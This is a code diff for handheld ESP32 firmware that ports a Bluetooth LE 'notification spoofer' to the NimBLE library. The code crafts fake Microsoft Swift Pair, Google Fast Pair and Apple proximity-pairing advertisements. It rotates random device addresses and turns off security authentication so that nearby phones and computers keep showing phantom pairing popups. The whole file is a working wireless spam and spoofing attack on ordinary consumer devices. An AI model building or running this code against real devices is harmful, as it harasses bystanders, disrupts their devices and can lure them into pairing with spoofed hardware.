@@ -1,14 +1,8 @@
 #include "arsenal.h"
 #include "core/display.h"
 #include "core/mykeyboard.h"
-#include <BLEAdvertising.h>
-#include <BLEDevice.h>
-#include <BLEServer.h>
-#include <BLEUtils.h>
+#include <NimBLEDevice.h>
 #include <globals.h>
-
-
-extern "C" int ble_hs_id_set_rnd(const uint8_t *rnd_addr);
 
 
 static const char *NOTIF_MESSAGES[] = {
@@ -30,17 +24,17 @@ static const int NUM_MESSAGES = sizeof(NOTIF_MESSAGES) / sizeof(NOTIF_MESSAGES[0
 
 #define NOTIF_SOURCE_UUID "9FBF120D-6301-42D9-8C58-25E699A21DBD"
 
-static BLEServer *pServer = nullptr;
-static BLECharacteristic *pNotifChar = nullptr;
+static NimBLEServer *pServer = nullptr;
+static NimBLECharacteristic *pNotifChar = nullptr;
 static int notifsSent = 0;
 static bool serverActive = false;
 
 
-static void sendSwiftPairSpam(BLEAdvertising *adv) {
-    BLEAdvertisementData advData;
+static void sendSwiftPairSpam(NimBLEAdvertising *adv) {
+    NimBLEAdvertisementData advData;
 
 
-    String mfgData = "";
+    std::string mfgData;
     mfgData += (char)0x06;
     mfgData += (char)0x00;
     mfgData += (char)0x03;
@@ -58,11 +52,11 @@ static void sendSwiftPairSpam(BLEAdvertising *adv) {
 }
 
 
-static void sendGoogleFastPair(BLEAdvertising *adv) {
-    BLEAdvertisementData advData;
+static void sendGoogleFastPair(NimBLEAdvertising *adv) {
+    NimBLEAdvertisementData advData;
 
 
-    String serviceData = "";
+    std::string serviceData;
     serviceData += (char)0x2C;
     serviceData += (char)0xFE;
 
@@ -70,18 +64,18 @@ static void sendGoogleFastPair(BLEAdvertising *adv) {
         serviceData += (char)random(256);
     }
 
-    advData.setServiceData(BLEUUID((uint16_t)0xFE2C), serviceData);
+    advData.setServiceData(NimBLEUUID((uint16_t)0xFE2C), serviceData);
     advData.setFlags(0x06);
 
     adv->setAdvertisementData(advData);
 }
 
 
-static void sendAppleProximityPairing(BLEAdvertising *adv) {
-    BLEAdvertisementData advData;
+static void sendAppleProximityPairing(NimBLEAdvertising *adv) {
+    NimBLEAdvertisementData advData;
 
 
-    String mfgData = "";
+    std::string mfgData;
     mfgData += (char)0x4C;
     mfgData += (char)0x00;
     mfgData += (char)0x07;
@@ -129,8 +123,9 @@ void arsenal_sms_notification_spoofer(void) {
 
         if (mode < 0) return;
 
-        BLEDevice::init("");
-        BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
+        NimBLEDevice::deinit(true);
+        NimBLEDevice::init("");
+        NimBLEAdvertising *pAdvertising = NimBLEDevice::getAdvertising();
 
         unsigned long startTime = millis();
 
@@ -139,7 +134,10 @@ void arsenal_sms_notification_spoofer(void) {
             uint8_t addr[6];
             for (int i = 0; i < 6; i++) addr[i] = random(256);
             addr[0] |= 0xC0;
-            ble_hs_id_set_rnd(addr);
+            NimBLEDevice::setSecurityAuth(false, false, false);
+            NimBLEAddress addrObj;
+            addrObj = NimBLEAddress(addr, BLE_ADDR_RANDOM);
+            esp_ble_gap_set_rand_addr(addrObj.getNative());
 
 
             if (mode == 0 || (mode == 2 && notifsSent % 3 == 0)) {
@@ -196,7 +194,7 @@ void arsenal_sms_notification_spoofer(void) {
                 tft.print("phantom device popups!");
 
                 tft.setTextColor(TFT_RED, bruceConfig.bgColor);
-                tft.drawCentreString("Esc to stop", tftWidth / 2, tftHeight - 20, 1);
+                tft.drawCentreString(String("Esc to stop"), tftWidth / 2, tftHeight - 20, 1);
             }
 
             if (check(EscPress)) break;
@@ -205,6 +203,6 @@ void arsenal_sms_notification_spoofer(void) {
         }
 
         pAdvertising->stop();
-        BLEDevice::deinit(false);
+        NimBLEDevice::deinit(true);
     });
 }
